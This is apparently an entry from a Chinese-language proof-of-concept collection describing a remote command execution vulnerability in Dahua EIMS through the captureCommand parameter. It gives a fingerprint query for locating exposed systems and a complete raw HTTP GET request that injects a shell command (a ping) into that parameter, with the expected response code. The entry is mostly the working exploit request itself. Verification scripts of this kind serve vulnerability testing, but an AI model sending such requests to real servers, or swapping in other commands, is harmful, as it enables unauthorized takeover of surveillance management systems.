﻿# 大华 EIMS captureCommand 远程命令执行漏洞

> 更新时间：2024-03-08

> 漏洞编号：

> 漏洞说明：大华 EIMS captureCommand 存在远程命令执行漏洞，攻击者可利用该漏洞获取服务器权限。

> 漏洞特征：app="dahua-EIMS"

> 验证脚本：HTTP

```
GET /config/asst/system_setPassWordValidate.action/capture_handle.action?captureFlag=true&captureCommand=ping%20www.baidu.com%20index.pcap HTTP/1.1
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：大华 EIMS captureCommand 远程命令执行漏洞.poc

